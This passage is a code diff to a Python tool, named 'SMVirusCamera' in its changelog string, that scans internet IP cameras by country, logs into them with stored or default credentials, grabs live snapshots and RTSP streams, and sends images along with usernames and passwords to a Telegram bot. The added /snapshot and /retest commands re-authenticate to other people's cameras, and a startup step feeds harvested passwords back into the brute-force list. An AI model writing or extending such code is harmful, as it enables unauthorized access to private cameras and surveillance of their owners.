+                    if len(_sn_parts) >= 3 and not _sn_parts[1][0].isdigit():
+                        _sn_cc = _sn_parts[1].upper()
+                        _sn_ip = _sn_parts[2]
+                    elif len(_sn_parts) == 2:
+                        _sn_ip = _sn_parts[1]
+                    if _sn_ip:
+                        _sn_pat = _sn_ip.replace('.', '_')
+                        # ── 1. Look for a saved snapshot file ─────────────────
+                        _sn_saved_path = None
+                        _sn_search_dirs = []
+                        if _sn_cc:
+                            _sn_search_dirs = [os.path.join(SCRIPT_DIR, 'Snapshots', _sn_cc)]
+                        else:
+                            _snap_root = os.path.join(SCRIPT_DIR, 'Snapshots')
+                            if os.path.isdir(_snap_root):
+                                _sn_search_dirs = [
+                                    os.path.join(_snap_root, d)
+                                    for d in os.listdir(_snap_root)
+                                    if os.path.isdir(os.path.join(_snap_root, d))
+                                ]
+                        for _sn_sd in _sn_search_dirs:
+                            if os.path.isdir(_sn_sd):
+                                _sn_f = next(
+                                    (f for f in os.listdir(_sn_sd) if _sn_pat in f), None
+                                )
+                                if _sn_f:
+                                    _sn_saved_path = os.path.join(_sn_sd, _sn_f)
+                                    break
+                        if _sn_saved_path:
+                            send_telegram_message(
+                                f"📷 Sending saved snapshot for <code>{_sn_ip}</code>"
+                                + (f" ({_sn_cc})" if _sn_cc else "") + "..."
+                            )
+                            send_telegram_file_blocking(
+                                _sn_saved_path,
+                                f"📷 {_sn_cc or 'XX'} | {_sn_ip} (saved)"
+                            )
+                        else:
+                            # ── 2. No saved snapshot — try live capture ────────
+                            send_telegram_message(
+                                f"🔍 No saved snapshot for <code>{_sn_ip}</code>. "
+                                f"Attempting live capture..."
+                            )
+                            # Find creds from ValidCamera files
+                            _sn_user = 'admin'; _sn_pw = ''; _sn_port = 80
+                            _sn_ctype = 'Camera'
+                            try:
+                                for _vf in find_valid_camera_files():
+                                    with open(_vf, 'r', encoding='utf-8', errors='replace') as _vfh:
+                                        _vblk = _vfh.read()
+                                    if _sn_ip in _vblk:
+                                        for _vline in _vblk.splitlines():
+                                            if 'Username' in _vline and ':' in _vline:
+                                                _sn_user = _vline.split(':', 1)[1].strip()
+                                            elif 'Password' in _vline and ':' in _vline:
+                                                _sn_pw = _vline.split(':', 1)[1].strip()
+                                            elif 'Port' in _vline and ':' in _vline:
+                                                try:
+                                                    _sn_port = int(_vline.split(':', 1)[1].strip())
+                                                except Exception: pass
+                                            elif 'Camera Type' in _vline and ':' in _vline:
+                                                _sn_ctype = _vline.split(':', 1)[1].strip()
+                                        break
+                            except Exception: pass
+                            _sn_live_data = None
+                            try:
+                                _sn_live_data = fetch_camera_snapshot(
+                                    _sn_ip, _sn_port, _sn_user, _sn_pw,
+                                    _sn_ctype, timeout=6.0
+                                )
+                            except Exception: pass
+                            if _sn_live_data:
+                                _sn_live_dir = os.path.join(
+                                    SCRIPT_DIR, 'Snapshots', _sn_cc or 'XX'
+                                )
+                                os.makedirs(_sn_live_dir, exist_ok=True)
+                                _sn_live_path = os.path.join(
+                                    _sn_live_dir,
+                                    f"{_sn_pat}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
+                                )
+                                try:
+                                    with open(_sn_live_path, 'wb') as _slw:
+                                        _slw.write(_sn_live_data)
+                                    send_telegram_file_blocking(
+                                        _sn_live_path,
+                                        f"📷 Live snapshot | {_sn_ip} "
+                                        + (f"({_sn_cc})" if _sn_cc else "")
+                                        + f"\n👤 {_sn_user}  🔑 {_sn_pw}"
+                                    )
+                                except Exception:
+                                    send_telegram_message(
+                                        f"⚠️ Got snapshot bytes but failed to save file for "
+                                        f"<code>{_sn_ip}</code>."
+                                    )
+                            else:
+                                send_telegram_message(
+                                    f"❌ Live capture failed for <code>{_sn_ip}</code>.\n"
+                                    f"Camera may be offline or not reachable from the scanner."
+                                )
+                    else:
+                        send_telegram_message(
+                            "ℹ️ Usage:\n"
+                            "<code>/snapshot CC IP</code> — send saved or live snapshot\n"
+                            "<code>/snapshot IP</code>    — search all countries, then try live\n"
+                            "Example: <code>/snapshot BD 103.1.2.3</code>"
+                        )
+
+                elif cmd.startswith("/retest "):
+                    # ── /retest IP — re-verify a camera's credentials are still valid ──
+                    _rt_parts = text.split()
+                    _rt_ip    = _rt_parts[1].strip() if len(_rt_parts) >= 2 else None
+                    if not _rt_ip:
+                        send_telegram_message(
+                            "ℹ️ Usage: <code>/retest IP</code>\n"
+                            "Example: <code>/retest 103.1.2.3</code>\n"
+                            "Re-tests stored credentials for a camera from your ValidCamera files."
+                        )
+                    else:
+                        send_telegram_message(
+                            f"🔄 Re-testing <code>{_rt_ip}</code> — looking up stored credentials..."
+                        )
+                        # ── Look up this IP in all ValidCamera files ───────────────
+                        _rt_user = None; _rt_pw = None; _rt_port = 80
+                        _rt_ctype = 'Camera'; _rt_rtsp = None
+                        try:
+                            for _vf in find_valid_camera_files():
+                                with open(_vf, 'r', encoding='utf-8', errors='replace') as _vfh:
+                                    _vblk = _vfh.read()
+                                if _rt_ip not in _vblk:
+                                    continue
+                                # Parse the block for this IP
+                                _in_block = False
+                                for _vline in _vblk.splitlines():
+                                    if f'IP Address: {_rt_ip}' in _vline:
+                                        _in_block = True
+                                    if not _in_block:
+                                        continue
+                                    if _vline.startswith('Username:') and ':' in _vline:
+                                        _rt_user = _vline.split(':', 1)[1].strip()
+                                    elif _vline.startswith('Password:') and ':' in _vline:
+                                        _rt_pw = _vline.split(':', 1)[1].strip()
+                                    elif _vline.startswith('Port:') and ':' in _vline:
+                                        try: _rt_port = int(_vline.split(':', 1)[1].strip())
+                                        except Exception: pass
+                                    elif _vline.startswith('Camera Type:') and ':' in _vline:
+                                        _rt_ctype = _vline.split(':', 1)[1].strip()
+                                    elif _vline.startswith('RTSP URL:') and ':' in _vline:
+                                        _rt_rtsp = _vline.split(':', 1)[1].strip()
+                                    elif _vline.startswith('=' * 10) and _in_block and _rt_user:
+                                        break   # end of block
+                                if _rt_user is not None:
+                                    break
+                        except Exception:
+                            pass
+
+                        if _rt_user is None:
+                            send_telegram_message(
+                                f"❌ No stored credentials found for <code>{_rt_ip}</code>.\n"
+                                f"Make sure this IP appears in a ValidCamera file."
+                            )
+                        else:
+                            # ── Attempt to re-authenticate ─────────────────────────
+                            _rt_ok = False; _rt_reason = 'no response'
+                            try:
+                                _rt_auth_url = f"http://{_rt_ip}:{_rt_port}/"
+                                _rt_resp = requests.get(
+                                    _rt_auth_url,
+                                    auth=(_rt_user, _rt_pw),
+                                    timeout=8, verify=False,
+                                    allow_redirects=True
+                                )
+                                if _rt_resp.status_code in (200, 201, 301, 302):
+                                    _rt_ok = True
+                                    _rt_reason = f'HTTP {_rt_resp.status_code}'
+                                elif _rt_resp.status_code == 401:
+                                    _rt_reason = 'credentials rejected (401)'
+                                elif _rt_resp.status_code == 403:
+                                    _rt_reason = 'access denied (403)'
+                                else:
+                                    _rt_reason = f'HTTP {_rt_resp.status_code}'
+                            except requests.exceptions.ConnectTimeout:
+                                _rt_reason = 'connection timed out'
+                            except requests.exceptions.ConnectionError:
+                                _rt_reason = 'connection refused / offline'
+                            except Exception as _rt_ex:
+                                _rt_reason = str(_rt_ex)[:80]
+
+                            _rt_geo = {}
+                            try:
+                                _rt_geo = get_geographic_location(_rt_ip)
+                            except Exception:
+                                pass
+                            _rt_city = _rt_geo.get('city', 'Unknown')
+                            _rt_country = _rt_geo.get('country', '')
+
+                            if _rt_ok:
+                                _rt_msg  = f"✅ <b>Camera still ALIVE</b>\n"
+                                _rt_msg += f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                                _rt_msg += f"🌐 IP: <code>{_rt_ip}:{_rt_port}</code>\n"
+                                _rt_msg += f"👤 User: <code>{_rt_user}</code>\n"
+                                _rt_msg += f"🔑 Pass: <code>{_rt_pw}</code>\n"
+                                _rt_msg += f"📷 Type: {_rt_ctype}\n"
+                                _rt_msg += f"📍 {_rt_city}, {_rt_country}\n"
+                                if _rt_rtsp and _rt_rtsp != 'N/A':
+                                    _rt_msg += f"📹 RTSP: <code>{_rt_rtsp}</code>\n"
+                                _rt_msg += f"✔️ Status: {_rt_reason}\n"
+                                _rt_msg += f"🕒 {datetime.now().strftime('%H:%M:%S')}"
+                                send_telegram_message(_rt_msg)
+                                # ── Grab a fresh snapshot ──────────────────────────
+                                try:
+                                    _rt_snap = fetch_camera_snapshot(
+                                        _rt_ip, _rt_port, _rt_user, _rt_pw,
+                                        _rt_ctype, timeout=6.0
+                                    )
+                                    if _rt_snap:
+                                        _rt_snap_dir = os.path.join(
+                                            SCRIPT_DIR, 'Snapshots',
+                                            _rt_geo.get('countryCode', 'XX')
+                                        )
+                                        os.makedirs(_rt_snap_dir, exist_ok=True)
+                                        _rt_snap_path = os.path.join(
+                                            _rt_snap_dir,
+                                            f"{_rt_ip.replace('.','_')}_{_rt_port}_retest_"
+                                            f"{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
+                                        )
+                                        with open(_rt_snap_path, 'wb') as _rtsf:
+                                            _rtsf.write(_rt_snap)
+                                        send_telegram_file_blocking(
+                                            _rt_snap_path,
+                                            f"📷 Fresh retest snapshot | {_rt_ip}:{_rt_port}\n"
+                                            f"👤 {_rt_user}  🔑 {_rt_pw}"
+                                        )
+                                except Exception:
+                                    pass
+                            else:
+                                _rt_msg  = f"❌ <b>Camera OFFLINE or credentials CHANGED</b>\n"
+                                _rt_msg += f"━━━━━━━━━━━━━━━━━━━━━━\n"
+                                _rt_msg += f"🌐 IP: <code>{_rt_ip}:{_rt_port}</code>\n"
+                                _rt_msg += f"👤 User: <code>{_rt_user}</code>\n"
+                                _rt_msg += f"🔑 Pass: <code>{_rt_pw}</code>\n"
+                                _rt_msg += f"📷 Type: {_rt_ctype}\n"
+                                _rt_msg += f"📍 {_rt_city}, {_rt_country}\n"
+                                _rt_msg += f"⚠️ Reason: {_rt_reason}\n"
+                                _rt_msg += f"🕒 {datetime.now().strftime('%H:%M:%S')}"
+                                send_telegram_message(_rt_msg)
 
         except requests.exceptions.Timeout:
             pass
@@ -10100,17 +11252,42 @@ def run_rtsp_file_scan(input_files=None):
         return _re_rfs.sub(r'[^A-Za-z0-9_\-]', '_', str(s).strip())
 
     remaining = total - start_idx
-    print(f"\n{C}[*] Running NVR Channel Split + Full Auto-Test on {remaining} camera(s)...{W}")
+    print(f"\n{C}[*] Running NVR Channel Split on {remaining} camera(s)...{W}")
     print(f"{C}    Output: RTSP_Results/<country>/<CC>_<Region>_<IP>_<Port>_<timestamp>.*{W}")
-    print(f"{C}    Features: NVR Split · CVE Check · Config Download · RTSP Live · Snapshot{W}\n")
+    print(f"{C}    Features: NVR Split · CVE Check · Snapshot{W}\n")
 
-    # ── Start live dashboard (same as Option 2) ───────────────────────────────
-    global scanned_count, total_ips, start_time, valid_results
-    scanned_count = start_idx
-    total_ips     = total
-    start_time    = time.time()
-    valid_results = []
-    start_scan_dashboard(10)
+    _rfs_start = time.time()
+
+    # ── Background progress ticker (stays live even while run_nvr_split blocks) ─
+    _rfs_tick = {'cur': start_idx, 'tot': total, 'found': found_total}
+    _rfs_tick_ev = threading.Event()
+
+    def _rfs_ticker():
+        while not _rfs_tick_ev.wait(2.0):
+            try:
+                _done = _rfs_tick['cur'] - start_idx
+                _rem  = max(1, _rfs_tick['tot'] - start_idx)
+                _fd   = _rfs_tick['found']
+                _el   = max(0.01, time.time() - _rfs_start)
+                _spd  = _done / _el if _done > 0 else 0
+                _pct  = int(_done * 100 / _rem)
+                _eta_s = int((_rem - _done) / _spd) if _spd > 0 else 0
+                _eta  = (f"{_eta_s//3600}h {(_eta_s%3600)//60}m" if _eta_s >= 3600
+                         else f"{_eta_s//60}m {_eta_s%60}s" if _eta_s >= 60
+                         else f"{_eta_s}s" if _eta_s > 0 else "calculating...")
+                _fill = int(20 * _pct / 100)
+                _bar  = '█' * _fill + '░' * (20 - _fill)
+                sys.stdout.write(
+                    f"\r\033[K{Fore.CYAN}🔍 [{_bar}] {_pct}% | "
+                    f"{_done}/{_rem} cams | ✅ {_fd} split | "
+                    f"{_spd:.2f}/s | ETA {_eta}{Style.RESET_ALL}"
+                )
+                sys.stdout.flush()
+            except Exception:
+                pass
+
+    _rfs_tick_ev.clear()
+    threading.Thread(target=_rfs_ticker, daemon=True).start()
 
     if TELEGRAM_CONFIG.get("enabled"):
         send_telegram_message(
@@ -10118,7 +11295,7 @@ def run_rtsp_file_scan(input_files=None):
             f"━━━━━━━━━━━━━━━━━━━━━━\n"
             f"Cameras: {remaining}\n"
             f"Files: {', '.join(os.path.basename(f) for f in selected)}\n"
-            f"Features: NVR Split · CVE · Config · RTSP · Snapshot · QR\n"
+            f"Features: NVR Split · CVE · Snapshot\n"
             f"🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
         )
 
@@ -10136,30 +11313,10 @@ def run_rtsp_file_scan(input_files=None):
             pw    = entry.get('password', '')
             ctype = entry.get('camera_type', 'Camera')
 
-            # ── Inline progress bar (like Option 2) ───────────────────────────
-            _rs_elapsed = max(0.01, time.time() - start_time)
-            _rs_done    = idx - start_idx
-            _rs_spd     = _rs_done / _rs_elapsed if _rs_elapsed > 0 and _rs_done > 0 else 0.01
-            _rs_rem_n   = total - idx
-            _rs_eta_s   = int(_rs_rem_n / _rs_spd) if _rs_spd > 0 else 0
-            _rs_eta     = (f"{_rs_eta_s//3600}h {(_rs_eta_s%3600)//60}m"
-                           if _rs_eta_s >= 3600 else
-                           f"{_rs_eta_s//60}m {_rs_eta_s%60}s"
-                           if _rs_eta_s >= 60 else f"{_rs_eta_s}s")
-            _rs_pct     = int(_rs_done * 100 / remaining) if remaining else 0
-            _rs_fill    = int(20 * _rs_pct / 100)
-            _rs_bar     = '█' * _rs_fill + '░' * (20 - _rs_fill)
-            sys.stdout.write(
-                f"\r\033[K{C}🔍 [{_rs_bar}] {_rs_pct}% | "
-                f"{_rs_done}/{remaining} | "
-                f"✅ {found_total} split | "
-                f"{_rs_spd:.1f}/s | ETA {_rs_eta}{W}"
-            )
+            # ── Clear ticker line then print camera header ────────────────────
+            sys.stdout.write('\r\033[K')
             sys.stdout.flush()
-
-            scanned_count = idx
-
-            print(f"\n{C}[{idx+1}/{total}]{W}  {G}{ip}:{port}{W}  {ctype}")
+            print(f"{C}[{idx+1}/{total}]{W}  {G}{ip}:{port}{W}  {ctype}")
 
             # ── Geo lookup — determines output folder ─────────────────────────
             geo     = get_geographic_location(ip)
@@ -10208,6 +11365,10 @@ def run_rtsp_file_scan(input_files=None):
             else:
                 print(f"  {R}[✗] No channels enumerated for {ip}:{port}{W}")
 
+            # ── Update background ticker with latest counts ───────────────────
+            _rfs_tick['cur']   = idx + 1
+            _rfs_tick['found'] = found_total
+
             # ── CVE lookup (immediate result + dashboard increment) ───────────
             try:
                 _cves = check_cve(ctype)
@@ -10221,19 +11382,6 @@ def run_rtsp_file_scan(input_files=None):
                     print(f"  {Y}  No known CVEs for {ctype}{W}")
             except Exception:
                 pass
-
-            # ── QR code for web interface ─────────────────────────────────────
-            try:
-                generate_qr_code(f"http://{ip}:{port}",
-                                  f"qr_{ip.replace('.','_')}_{port}_web.png")
-            except Exception:
-                pass
-
-            # ── Full 11-step auto-test pipeline in background daemon thread ───
-            # Runs: RTSP brute · RTSP auth · sub-stream · config download ·
-            #       image quality · account enum · admin test · QR · CVE ·
-            #       M3U update — all increment dashboard counters automatically
-            _launch_auto_test(ip, port, user, pw, ctype)
 
             # ── Snapshot capture + Telegram photo ────────────────────────────
             if TELEGRAM_CONFIG.get("enabled"):
@@ -10256,23 +11404,26 @@ def run_rtsp_file_scan(input_files=None):
             _rtsp_now = time.time()
             if TELEGRAM_CONFIG.get("enabled") and (_rtsp_now - _rtsp_last_tg_time >= 300):
                 _rtsp_last_tg_time = _rtsp_now
-                _rtsp_el   = int(_rtsp_now - start_time)
+                _rtsp_el   = int(_rtsp_now - _rfs_start)
                 _rtsp_el_m = _rtsp_el // 60
                 _rtsp_el_s = _rtsp_el % 60
+                _tg_done   = idx - start_idx + 1
+                _tg_pct    = int(_tg_done * 100 / remaining) if remaining else 0
+                _tg_spd    = _tg_done / max(0.01, _rtsp_el)
+                _tg_eta_s  = int((remaining - _tg_done) / _tg_spd) if _tg_spd > 0 else 0
+                _tg_eta    = (f"{_tg_eta_s//3600}h {(_tg_eta_s%3600)//60}m" if _tg_eta_s >= 3600
+                              else f"{_tg_eta_s//60}m {_tg_eta_s%60}s" if _tg_eta_s >= 60
+                              else f"{_tg_eta_s}s")
                 with _dash_lock:
                     _tg_cve = _dash_cve_count
-                    _tg_cfg = _dash_config_count
-                    _tg_rsp = _dash_rtsp_count
                 tg_prog  = f"⏳ <b>RTSP Scan Progress</b>\n"
                 tg_prog += f"━━━━━━━━━━━━━━━━━━━━━━\n"
-                tg_prog += f"🔍 Processed: {_rs_done + 1}/{remaining} ({_rs_pct}%)\n"
+                tg_prog += f"🔍 Processed: {_tg_done}/{remaining} ({_tg_pct}%)\n"
                 tg_prog += f"✅ Devices Split: {found_total}\n"
                 tg_prog += f"🔓 CVEs Found: {_tg_cve}\n"
-                tg_prog += f"⚙️ Configs Downloaded: {_tg_cfg}\n"
-                tg_prog += f"📹 RTSP Live: {_tg_rsp}\n"
-                tg_prog += f"🚀 Speed: {_rs_spd:.1f} cam/s\n"
+                tg_prog += f"🚀 Speed: {_tg_spd:.1f} cam/s\n"
                 tg_prog += f"⏱ Elapsed: {_rtsp_el_m}m {_rtsp_el_s}s\n"
-                tg_prog += f"🏁 ETA: {_rs_eta}\n"
+                tg_prog += f"🏁 ETA: {_tg_eta}\n"
                 tg_prog += f"🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                 try:
                     send_telegram_message(tg_prog)
@@ -10318,7 +11469,9 @@ def run_rtsp_file_scan(input_files=None):
             except Exception:
                 pass
 
-    stop_scan_dashboard()
+    _rfs_tick_ev.set()
+    sys.stdout.write('\r\033[K')
+    sys.stdout.flush()
 
     # ── Update per-country stats ──────────────────────────────────────────────
     for geo_cc, scanned in cc_scanned.items():
@@ -10329,11 +11482,9 @@ def run_rtsp_file_scan(input_files=None):
                 break
         update_rtsp_stats(geo_cc, cn, cc_found.get(geo_cc, 0), scanned)
 
-    # ── Collect final dashboard counters ─────────────────────────────────────
+    # ── Collect final CVE counter (only dashboard counter still active) ───────
     with _dash_lock:
         _final_cve = _dash_cve_count
-        _final_cfg = _dash_config_count
-        _final_rsp = _dash_rtsp_count
 
     # ── Summary ───────────────────────────────────────────────────────────────
     print(f"\n{C}{'═'*65}{W}")
@@ -10341,8 +11492,6 @@ def run_rtsp_file_scan(input_files=None):
     print(f"  Cameras processed     : {total - start_idx}")
     print(f"  Devices with channels : {found_total}")
     print(f"  CVEs found            : {_final_cve}")
-    print(f"  Configs downloaded    : {_final_cfg}")
-    print(f"  RTSP streams live     : {_final_rsp}")
     print(f"  Results folder        : RTSP_Results/")
     print(f"{C}{'═'*65}{W}")
 
@@ -10364,8 +11513,6 @@ def run_rtsp_file_scan(input_files=None):
             f"Cameras processed: {total - start_idx}\n"
             f"Devices with channels: {found_total}\n"
             f"🔓 CVEs found: {_final_cve}\n"
-            f"⚙️ Configs downloaded: {_final_cfg}\n"
-            f"📹 RTSP streams live: {_final_rsp}\n"
             f"Countries: {', '.join(sorted(cc_found.keys())) if cc_found else 'N/A'}\n"
             f"🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
         )
@@ -11896,6 +13043,10 @@ def _scan_dashboard_loop(interval: int) -> None:
                 f"Speed {G}{_spd:.0f}{W} IP/s  "
                 f"Elapsed {Y}{_el_str}{W}  ETA {Y}{_eta}{W}"
             ))
+            _sess_el  = max(0, time.time() - _SESSION_START_TIME)
+            _sess_str = (f"{int(_sess_el//3600)}h {int((_sess_el%3600)//60)}m"
+                         if _sess_el >= 3600 else f"{int(_sess_el//60)}m {int(_sess_el%60)}s")
+            print(_row(f"Session Running  {Y}{_sess_str}{W}"))
             print(f"{C}╠{'═' * _IW}╣{W}")
             print(_row(f"Cameras Found  {G}{_cam_count}{W}"))
             for _t, _n in sorted(_types.items(), key=lambda x: -x[1])[:5]:
@@ -12242,6 +13393,8 @@ def generate_m3u_from_all_results() -> Optional[str]:
                         elif line.startswith('RTSP URL:'):      _rtsp = line.split('URL:',1)[1].strip()
                         elif line.startswith('=') and _ip and _rtsp and _rtsp.startswith('rtsp://'):
                             flag = country_flag(cc)
+                            _cc_name = next((v['name'] for v in COUNTRIES.values() if v.get('code') == cc), cc)
+                            _m.write(f'#EXTGRP:{_cc_name}\n')
                             _m.write(f'#EXTINF:-1 tvg-id="{_ip}" tvg-country="{cc}",'
                                      f'{flag} {cc} | {_ct} | {_ip}\n')
                             _m.write(f'{_rtsp}\n')
@@ -12319,7 +13472,7 @@ def generate_m3u_from_rtsp_tested() -> Optional[str]:
                 _ip = _ct = _rtsp = _cc = ''
                 for line in block.strip().splitlines():
                     line = line.strip()
-                    if line.startswith('IP Address:'):
+                    if line.startswith('IP Address:') or line.startswith('IP:'):
                         _ip = line.split(':', 1)[1].strip()
                     elif line.startswith('Camera Type:'):
                         _ct = line.split(':', 1)[1].strip()
@@ -12578,20 +13731,60 @@ def _flush_stdin() -> None:
     Discard any keystrokes buffered in stdin while a threaded progress bar
     was running. Without this, the next input() call is consumed instantly
     by stale characters and the prompt appears to ignore the user.
-    Works on Linux/macOS (termios); silently skips on other platforms.
+    Uses multiple strategies in order of reliability.
     """
+    # Strategy 1: termios tcflush on real stdin fd
     try:
         import termios
         termios.tcflush(sys.stdin.fileno(), termios.TCIFLUSH)
+        return  # success — done
     except Exception:
         pass
-    # Secondary drain: read-drain any chars still in the buffer
+    # Strategy 2: open /dev/tty directly and flush it
+    try:
+        import termios as _t
+        with open('/dev/tty', 'rb') as _tty:
+            _t.tcflush(_tty.fileno(), _t.TCIFLUSH)
+        return
+    except Exception:
+        pass
+    # Strategy 3: select-drain any chars still in the buffer
     try:
         import select
-        while select.select([sys.stdin], [], [], 0)[0]:
+        while select.select([sys.stdin], [], [], 0.0)[0]:
             sys.stdin.read(1)
     except Exception:
         pass
+
+
+def _safe_prompt(prompt: str, default: str = '') -> str:
+    """
+    Display an interactive prompt and read one line, even after heavy
+    \r-based progress output. Falls back to plain input() if /dev/tty
+    is unavailable.
+
+    Why /dev/tty?  After a long scan with sys.stdout.write('\\r...'),
+    the terminal stdin buffer may contain stale keystrokes.  Opening
+    /dev/tty directly bypasses sys.stdin and reads from the actual
+    terminal, which is always clean.
+    """
+    sys.stdout.write('\r\033[K')          # clear any dangling progress line
+    sys.stdout.flush()
+    _flush_stdin()
+    # Attempt to use /dev/tty for a clean read
+    try:
+        with open('/dev/tty', 'r') as _tty:
+            sys.stdout.write(prompt)
+            sys.stdout.flush()
+            _ans = _tty.readline().strip()
+            return _ans if _ans else default
+    except Exception:
+        pass
+    # Fallback: plain input()
+    try:
+        return input(prompt).strip() or default
+    except (EOFError, KeyboardInterrupt):
+        return default
 
 
 def _save_live_rtsp_entry(ip: str, rtsp_url: str, cc: str = 'XX',
@@ -13213,12 +14406,9 @@ def _rtsp_batch_mode():
         prev_f    = prog.get('found', 0)
         prev_fail = prog.get('failed', 0)
         prev_ts   = prog.get('timestamp', '')
-        try:
-            print(f"\n{Y}[?] Interrupted session found: {prev_idx}/{prog.get('total',total)} "
-                  f"done, {prev_f} live / {prev_fail} fail  (saved {prev_ts}).{W}")
-            rc = input(f"{G}Resume? (y/n): {W}").strip().lower()
-        except (EOFError, KeyboardInterrupt):
-            rc = 'n'
+        print(f"\n{Y}[?] Interrupted session found: {prev_idx}/{prog.get('total',total)} "
+              f"done, {prev_f} live / {prev_fail} fail  (saved {prev_ts}).{W}")
+        rc = _safe_prompt(f"{G}Resume? (y/n): {W}", default='n').lower()
         if rc == 'y':
             start_idx    = prev_idx
             found_total  = prev_f
@@ -13429,11 +14619,9 @@ def _rtsp_batch_mode():
     _clear_rtsp_tester_progress()
 
     if _found_total > 0:
-        _flush_stdin()
-        try:
-            _m3u_ans = input(f"\n{Y}[?] Generate M3U playlist now? (y/n) [y]: {W}").strip().lower()
-        except (EOFError, KeyboardInterrupt):
-            _m3u_ans = 'y'
+        _m3u_ans = _safe_prompt(
+            f"\n{Y}[?] Generate M3U playlist now? (y/n) [y]: {W}", default='y'
+        ).lower()
         if _m3u_ans != 'n':
             _m3u_path = generate_m3u_from_rtsp_tested()
             if _m3u_path and TELEGRAM_CONFIG.get("enabled"):
@@ -15600,6 +16788,10 @@ def main():
     global start_time, scanned_count, total_ips, valid_results
 
     # ── Startup init ──────────────────────────────────────────────────────────
+    # Global socket default timeout: ensures every socket that does NOT call
+    # .settimeout() explicitly still has a hard ceiling, preventing any thread
+    # from blocking indefinitely on a connect/recv and freezing the entire scan.
+    socket.setdefaulttimeout(12)
     _ensure_dependencies()
     _check_and_raise_ulimit()
     _start_ts_cache()
@@ -15633,6 +16825,100 @@ def main():
         except (IndexError, IOError) as _lf_e:
             print(f"[!] --log-file error: {_lf_e}", file=sys.__stderr__)
 
+    # ── TeeLogger vs input() conflict fix ────────────────────────────────────
+    # Temporarily restore sys.__stdout__ during input() calls so interactive
+    # prompts are not garbled by the Tee wrapper.
+    try:
+        import builtins as _builtins
+        _original_input = _builtins.input
+        def _tee_safe_input(prompt=''):
+            _saved_out = sys.stdout
+            _saved_err = sys.stderr
+            sys.stdout = sys.__stdout__
+            sys.stderr = sys.__stderr__
+            try:
+                return _original_input(prompt)
+            finally:
+                sys.stdout = _saved_out
+                sys.stderr = _saved_err
+        _builtins.input = _tee_safe_input
+    except Exception:
+        pass
+
+    # ── CHANGELOG: write first-run entry ─────────────────────────────────────
+    try:
+        _cl_is_new = not os.path.exists(_CHANGELOG_FILE)
+        with open(_CHANGELOG_FILE, 'a', encoding='utf-8') as _clf:
+            if _cl_is_new:
+                _clf.write('SMVirusCamera — CHANGELOG\n')
+                _clf.write('=' * 60 + '\n')
+            _clf.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Session started\n")
+    except Exception:
+        pass
+
+    # ── Silent network benchmark at startup ──────────────────────────────────
+    if '--no-benchmark' not in sys.argv and '--benchmark' not in sys.argv:
+        try:
+            print(f"{Fore.CYAN}[*] Running startup network benchmark...{Style.RESET_ALL}", end='', flush=True)
+            _bm_result = run_silent_benchmark()
+            if _bm_result > 0:
+                print(f"\r\033[K{Fore.CYAN}[✓] Network benchmark: recommending {_bm_result} threads{Style.RESET_ALL}")
+            else:
+                print(f"\r\033[K{Fore.YELLOW}[!] Benchmark skipped — using hardware defaults{Style.RESET_ALL}")
+        except Exception:
+            print()  # clear the incomplete line
+
+    # ── Import credentials from existing ValidCamera files at startup ─────────
+    try:
+        _vc_files = find_valid_camera_files()
+        _vc_added = 0
+        for _vc_fp in _vc_files[:10]:  # limit to 10 most recent
+            with open(_vc_fp, 'r', encoding='utf-8', errors='replace') as _vc_fh:
+                _vc_usr = _vc_pw = ''
+                for _vc_ln in _vc_fh:
+                    _vc_ln = _vc_ln.strip()
+                    if _vc_ln.startswith('Username:'):
+                        _vc_usr = _vc_ln.split(':', 1)[1].strip()
+                    elif _vc_ln.startswith('Password:'):
+                        _vc_pw = _vc_ln.split(':', 1)[1].strip()
+                    elif _vc_ln.startswith('=') and _vc_usr and _vc_pw:
+                        _vc_pair = (_vc_usr, _vc_pw)
+                        if _vc_pair not in DEFAULT_CREDENTIALS:
+                            DEFAULT_CREDENTIALS.append(_vc_pair)
+                            _vc_added += 1
+                        _vc_usr = _vc_pw = ''
+        if _vc_added:
+            print(f"{Fore.CYAN}[*] Imported {_vc_added} credential(s) from ValidCamera history.{Style.RESET_ALL}")
+    except Exception:
+        pass
+
+    # ── GeoLite2-City.mmdb staleness check ───────────────────────────────────
+    try:
+        _mmdb_paths = [
+            os.path.join(SCRIPT_DIR, 'GeoLite2-City.mmdb'),
+            os.path.join(SCRIPT_DIR, 'GeoLite2-City', 'GeoLite2-City.mmdb'),
+        ]
+        _mmdb_found = next((p for p in _mmdb_paths if os.path.exists(p)), None)
+        if _mmdb_found:
+            _mmdb_age_days = (time.time() - os.path.getmtime(_mmdb_found)) / 86400
+            if _mmdb_age_days > 30:
+                print(
+                    f"{Fore.YELLOW}[!] GeoLite2-City.mmdb is "
+                    f"{int(_mmdb_age_days)} days old — geo-filtering may be "
+                    f"inaccurate. Download a fresh copy from "
+                    f"https://dev.maxmind.com/geoip/geolite2-free-geolocation-data"
+                    f"{Style.RESET_ALL}"
+                )
+        else:
+            print(
+                f"{Fore.YELLOW}[!] GeoLite2-City.mmdb not found — geo-filtering "
+                f"will fall back to ip-api.com (rate-limited). "
+                f"Download from https://dev.maxmind.com/geoip/geolite2-free-geolocation-data"
+                f"{Style.RESET_ALL}"
+            )
+    except Exception:
+        pass
+
     # ── CLI argument parsing ──────────────────────────────────────────────────
     import argparse as _ap
     # ── Custom --help / -h: styled flag reference, then exit ─────────────────
@@ -15640,6 +16926,42 @@ def main():
         print_banner()
         print_feature_help()
         sys.exit(0)
+
+    # ── --quick: restrict port scan to 4 most common ports ────────────────────
+    if '--quick' in sys.argv:
+        global _quick_scan_mode
+        _quick_scan_mode = True
+        print(f"{Fore.CYAN}[*] Quick mode: scanning only ports {_QUICK_PORTS}{Style.RESET_ALL}")
+
+    # ── --country-list CC,CC,CC: run specified countries sequentially ──────────
+    if '--country-list' in sys.argv:
+        try:
+            _cl_idx = sys.argv.index('--country-list')
+            _cl_codes = [c.strip().upper() for c in sys.argv[_cl_idx + 1].split(',') if c.strip()]
+            if _cl_codes:
+                print(f"{Fore.CYAN}[*] Country-list mode: will scan {', '.join(_cl_codes)}{Style.RESET_ALL}")
+                sys.argv = [a for a in sys.argv if a != '--country-list'] + ['--country'] + _cl_codes
+        except (IndexError, ValueError):
